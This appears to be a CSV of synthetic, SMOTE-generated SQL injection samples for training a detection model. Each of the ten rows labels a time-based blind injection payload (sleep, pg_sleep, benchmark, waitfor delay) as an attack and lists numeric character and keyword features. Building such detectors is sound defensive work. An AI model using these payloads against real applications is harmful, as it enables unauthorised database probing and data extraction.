id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,0.9536370488556563,79.40637510918963,28.40637510918962,3.9329517375878207,28.625500436758486,15.0,26.187249781620757,9.593624890810379,0.360006795922404,0.18892698291060186,0.33009945589742307,0.12096676526957109,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.296812445405189,0.296812445405189,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,1.4916650100273845,29.688869073026062,13.933392780921809,2.99404468062705,10.622261853947874,2.0,13.066607219078193,4.0,0.3583668561933052,0.06738191017695158,0.43948741327584007,0.13476382035390316,0.0,0.0,0.6222618539478725,0.0,0.0,0.0,0.0,2.688869073026064,0.0,0.0,0.0,0.6222618539478726,0.0,0.0,0.31113092697393624,0.6888690730260638,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.31113092697393624,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3111309269739364
SMOTE_000003,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,0.631553827953871,102.8777422358795,30.12225776412051,3.9018472652404816,26.12225776412051,29.87774223587949,36.0,10.877742235879492,0.2539283506159857,0.2904126387987057,0.3499334931951588,0.10572551739014974,0.8777422358794913,0.12225776412050865,1.7554844717589826,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,3.755484471758983,0.8777422358794913,0.12225776412050873,0.8777422358794913,0.12225776412050873,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000004,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.9033614955577867,65.88637431483635,20.0,3.123072915323399,23.05681284258183,1.31439571913939,31.20077003397573,10.31439571913939,0.35142032106454574,0.01969530172100102,0.4723536667509359,0.1565307104635173,3.31439571913939,0.0,0.0,0.0,0.0,1.0,0.0,5.31439571913939,0.0,0.6856042808606102,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.6856042808606102,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3143957191393898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,0.26333562217270307,51.72703363825205,18.30293068260502,3.09253252024752,10.545275228689036,10.0,24.18175840956301,7.0,0.20247080618755692,0.1938156438274135,0.46804259930584013,0.13567095067918947,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.060586136521003864,0.9394138634789961,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.060586136521003864,0.0,0.0,0.060586136521003864,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9394138634789961,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.060586136521004
SMOTE_000006,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,1.1023981500449307,60.55596115882786,19.32326919625708,3.2177529249055508,24.706923214971685,1.3232691962570788,26.555961158827863,7.969807588771236,0.4132713191754029,0.021380387778076784,0.4347014136739286,0.13064687937259167,3.3232691962570784,0.0,0.0,0.0,0.0,0.0,0.0,4.646538392514158,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.6767308037429214,0.0,0.0,0.0,1.0,0.3232691962570787,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.9307048937409326,76.26796876985097,26.36953125458099,3.4312536527087847,19.789843751527,10.0,34.898437515269976,11.579687503053995,0.2604599695001177,0.13182207754152098,0.45589983107438475,0.15181812188397661,0.21015624847300274,0.7898437515269973,2.0,0.0,0.0,1.0,0.0,5.579687503053995,0.9999999999999999,1.0,0.0,3.0,0.21015624847300268,0.7898437515269973,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.7898437515269973,0.21015624847300277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000008,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,1.4688245392367698,68.20823993115225,18.17731906496411,2.8286210078920333,19.080411151582926,1.7257730216547031,36.0474176279864,11.35463812992822,0.29427697755825566,0.02555586549664586,0.5103482612392612,0.1698188957058373,0.0,3.725773021654704,0.0,0.0,0.0,1.0,0.0,6.354638129928221,0.2742269783452965,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.2742269783452966,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2742269783452964
SMOTE_000009,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.124974317951223,50.28757064310721,25.24817215339812,4.2473219730446115,24.543054182912854,2.449634430679624,10.395613168155485,12.899268861359248,0.47967112468415507,0.05099878417704862,0.1894031501738741,0.2799269409649222,2.899268861359248,0.0,2.0,0.0,0.0,0.0,0.0,1.449634430679624,0.0,2.6510967079611283,1.0,2.899268861359248,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.44963443067962394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.449634430679624
SMOTE_000010,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,1.6221170943600374,45.0,20.371186415915055,3.5415484504168018,13.628813584084943,10.0,16.0,5.371186415915057,0.3028625240907765,0.2222222222222222,0.35555555555555557,0.1193596981314457,0.0,0.6855932079575282,1.3711864159150564,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,0.0,0.0,2.3711864159150564,0.0,0.6855932079575282,0.6855932079575282,0.3144067920424718,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.6855932079575282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6855932079575284
